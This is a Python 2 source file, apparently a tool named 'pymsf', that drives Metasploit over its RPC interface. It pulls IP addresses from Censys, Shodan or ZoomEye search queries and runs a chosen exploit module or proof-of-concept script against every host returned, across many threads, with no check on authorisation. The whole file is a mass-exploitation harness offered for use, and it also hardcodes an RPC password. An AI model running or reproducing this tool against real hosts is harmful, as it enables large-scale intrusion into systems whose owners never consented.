import msfrpc
from censys import Censys
from shodan import Shodan
from zoomeye import Zoomeye
from Queue import Queue
from time import sleep
from time import time
import re
import optparse
import os
import sys
import threading

class MyMsf(object):
    def __init__(self):
        self.client = msfrpc.Msfrpc({})
        self.console_id = None
        self.query = None
        self.search = None
        self.page = 10
        self.STOP_ME = [False]
        self.queue = Queue()
        self.module = None
        self.moduleType = None
        self.opts = {}
    
    def login(self):
        """Login the msf client"""
        self.client.login('msf', 'abc123')

    def get_console(self):
        """Get a console"""
        console = self.client.call('console.create')
        self.console_id = console['id']
        welcome = self.client.call('console.read', [self.console_id])
        return welcome

    def send_command(self, command, search, thread_num, file_name):
        """Execute a command"""
        if search == "censys":
            self.search = Censys()
        elif search == "zoomeye":
            self.search = Zoomeye()
        elif search == "shodan":
            self.search = Shodan()
        else:
            print "you got a wrong type of search engine, you can select censys, shodan or zoomeye as your scan engine."
            sys.exit()
        
        if self.setQuery(command):
            return {'prompt': '', 'busy': False, 'data': 'QUERY => %s\n' % self.query}
        elif self.setPage(command):
            return {'prompt': '', 'busy': False, 'data': 'PAGE => %d\n' % self.page}
        else:
            if command == "exploit\n" or command == "run\n":
                if not self.search:
                    print "please select a search engine using the -s or --search option."
                    sys.exit()
                elif self.query:
                    if self.module and self.moduleType:
                        self.search.getConfig()
                        threads = []
                        t1 = threading.Thread(target = self.search.searchIP, args = (self.query, self.page, self.queue, self.STOP_ME))
                        threads.append(t1)
                        t2 = threading.Thread(target=self.DoExploit, args=(file_name, command, thread_num))
                        threads.append(t2)
                        for t in threads:
                            t.setDaemon(True)
                            t.start()

                        for t in threads:
                            t.join()
                    result = {'prompt': '', 'busy': False, 'data': '\n'}
                else:
                    return {'prompt': '', 'busy': False, 'data': 'QUERY must be setted\n'}
            else:
                isSuccess = self.client.call('console.write', [self.console_id, command])
                if isSuccess.has_key('error'):
                    self.login()
                    self.client.call('console.write', [self.console_id, command])
                sleep(0.5)
                result = self.client.call('console.read', [self.console_id])
                while result['busy']:
                    if result['data']:
                        print result['data']
                    sleep(0.5)
                    result = self.client.call('console.read', [self.console_id])
                
                if command == "show options\n":
                    if file_name:
                        result['data'] = "%s   FILE              %s\n" % (result['data'], file_name)
                    result['data'] = "%s   QUERY             %s\n" % (result['data'], self.query)
                    result['data'] = "%s   PAGE              %s\n" % (result['data'], self.page)

                if command.startswith("use"):
                    module = command.split(' ')[1].strip()
                    self.moduleType = module[:module.find('/')]
                    self.module = module[module.find('/')+1:]

                if command.startswith("set"):
                    options = command.split(' ')
                    self.opts[options[1]] = options[2].strip()
            
            return result
    
    def setQuery(self, command):
        r_query = r"set query (.+?)\n"
        query = re.search(r_query, command, re.I)
        if query:
            self.query = query.groups()[0]
            return True
        else:
            return False
    
    def setPage(self, command):
        r_page = r"set page (\d+)\n"
        page = re.search(r_page, command, re.I)
        if page:
            self.page = int(page.groups()[0])
            return True
        else:
            return False

    def DoExploit(self, file_name, command, thread_num):
        while not self.STOP_ME[0]:
            while not self.queue.empty():
                ip = self.queue.get()
                result_str = ""
                if file_name:
                    os.system("python %s %s" % (file_name, ip))
                else:
                    while len(self.client.call('job.list', [])) >= thread_num:
                        sleep(1)
                        self.isTimeout(self.client.call('job.list', []))
                    
                    self.opts['RHOSTS'] = ip
                    self.opts['RHOST'] = ip
                    print "detecting %s" % ip
                    opts = self.client.call('module.execute', [self.moduleType, self.module, self.opts])
            
        while self.client.call('job.list', []):
            sleep(1)
            self.isTimeout(self.client.call('job.list', []))
            
        print "Done!\n"
        print "using creds, services, vulns .etc commands to see specific informations,\ntype help to see the details."

    def isTimeout(self, job_list):
        for job_id in job_list.keys():
            print "the job id is %s" % job_id
            try:
                job_info = self.client.call('job.info', [int(job_id),])
            except:
                self.login()
                job_info = self.client.call('job.info', [int(job_id),])
            
            if job_info.has_key('error_message') and job_info['error_message'] == 'Invalid Job':
                continue
            elif job_info.has_key('error'):
                print job_info['error_message']
                sys.exit()
            used_time = time() - job_info['start_time']
            if used_time > 60:
                self.client.call('job.stop', [int(job_id),])

class Operate(object):
    def __init__(self):
        self.msf = MyMsf()

    def normal(self, search, thread_num, file_name = None):
        self.msf.login()
        prompt = self.msf.get_console()['prompt']
        while True:
            command = raw_input(prompt)
            if command == "exit":
                break
            result = self.msf.send_command("%s\n" % command, search, thread_num, file_name)
            if result['prompt']:
                prompt = result['prompt'].replace('\x01\x02', '')
            if result['data']:
                print result['data']

def main():
    usage = "usage: %prog [options] "
    parse = optparse.OptionParser(usage = usage)
    parse.add_option("-n", "--normal", action = "store_true", dest = "normal", help = "normal mode")
    parse.add_option("-s", "--search", dest = "search", action = "store", help = "chose a search engine, for example: censys, zoomeye or shodan")
    parse.add_option("-f", "--file", dest = "file_name", action = "store", help = "the poc file you want to run")
    parse.add_option("-t", "--threads", dest = "thread_num", action = "store", help = "set the thread num")
    (options, args) = parse.parse_args()
    if not options.file_name:
        options.normal = True
    if not options.search:
        options.search = "censys"
    if not options.thread_num:
        options.thread_num = 10
    
    op = Operate()
    if options.normal:
        op.normal(options.search, options.thread_num)
    elif options.file_name:
        op.normal(options.search, options.thread_num, options.file_name)

if __name__ == '__main__':
    print """
    ==============================
    |--\ \  / |\  /|  /----  |----
    |--/  \/  | \/ |  |---\  |----
    |     ||  |    |  ____|  |
    ==============================
                   made by s0m30ne
    ------------------------------
    """
    main()
